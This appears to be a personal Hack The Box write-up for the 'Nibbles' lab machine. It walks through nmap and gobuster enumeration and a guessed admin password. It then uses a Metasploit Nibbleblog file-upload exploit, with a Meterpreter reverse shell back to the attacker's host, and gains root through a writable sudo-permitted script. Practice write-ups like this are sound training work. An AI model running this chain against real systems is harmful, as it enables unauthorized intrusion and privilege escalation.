
22-08-2024 23:17 pm

Tags: 

References: https://app.hackthebox.com/machines/Nibbles


# Nibbles

- nmap initial scan to see services

```
[2024-08-22 16:28] root@kali:/home/kali/Desktop/HTB_Machines/Nibbles # nmap -sC -sV -oN initial 10.10.10.75 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-22 16:28 EDT
Nmap scan report for 10.10.10.75
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.96 seconds
```

- we initially see 2 services: ssh and http

- let's see the http one

![[Cybersecurity/HTB Academy Notes/Images/Pasted image 20240822233300.png]]

- we are greeted by a custom message

- let's try curling the page
```
[2024-08-22 16:29] root@kali:/home/kali/Desktop/HTB_Machines/Nibbles # curl http://10.10.10.75/ 
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

- we notice that we are given a directory to follow

![[Cybersecurity/HTB Academy Notes/Images/Pasted image 20240822233828.png]]

- let's try enumerating the website with gobuster and a common list
```
gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt
```

- after enumeration we have the following results:
```
/.hta                 (Status: 403) [Size: 301]
/.htaccess            (Status: 403) [Size: 306]
/.htpasswd            (Status: 403) [Size: 306]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
```

- let's search inside each one
- when entering the /README directory we can gate some information about the service
```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

- next we search /admin.php
![[Cybersecurity/HTB Academy Notes/Images/Pasted image 20240822234729.png]]

- for now we won't guess because we might get blacklisted

- searching the /content directory we stumble across some data
![[Cybersecurity/HTB Academy Notes/Images/Pasted image 20240822234909.png]]
- from this, we now know that the username is admin for the login page

- we guess that the password might be nibbles....
![[Cybersecurity/HTB Academy Notes/Images/Pasted image 20240822235437.png]]
- and we were right, yay

- we got access to the admin's dashboard but all we could do is mess a bit with the website
- but we want a shell so we launch msfconsole

- from the /README file we know the version so we can start there
- msfconsole has an exploit for nibbleblog_file_upload but we don't know that it's the correct version so we do some more research for our version
- we stumble across CVE-2015-6967, arbitrary file upload which is what we have in msfconsole
- next, we configure the payload....
```
Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/nibbleblog_file_upload) > show options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.235    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3

msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.10.10.75
RHOSTS => 10.10.10.75
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST 10.10.16.5
LHOST => 10.10.16.5
msf6 exploit(multi/http/nibbleblog_file_upload) > show options

msf6 exploit(multi/http/nibbleblog_file_upload) > run

[*] Started reverse TCP handler on 10.10.16.5:4444 
[*] Sending stage (39927 bytes) to 10.10.10.75
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.16.5:4444 -> 10.10.10.75:35456) at 2024-08-22 17:12:01 -0400

meterpreter > getuid
Server username: nibbler
meterpreter > sysinfo
Computer    : Nibbles
OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64
Meterpreter : php/linux
```
- we can see that we are nibbler user and not root
- first off, let's create a shell (just write shell in meterpreter)
- from here we could escalate privileges
- we can see that the system has python3 
```
which python3
/usr/bin/python3
```
- next we spawn an interactive shell....
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- we got the user.txt flag....
```
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd ~
<ml/nibbleblog/content/private/plugins/my_image$ cd ~                        
nibbler@Nibbles:/home/nibbler$ ls
ls
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ cat user.txt
```
- we see that we may run monitor.sh....
```
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
- we can modify the monitor.sh script and echo into it "/bin/bash" in order to escalate privileges
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "/bin/bash" >> monitor.sh
echo "/bin/bash" >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh 
sudo ./monitor.sh
'unknown': I need something more specific.
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
root@Nibbles:/home/nibbler/personal/stuff# whoami
whoami
root
root@Nibbles:/home/nibbler/personal/stuff# cd ~
cd ~
root@Nibbles:~# ls
ls
root.txt
```

# Useful Links:

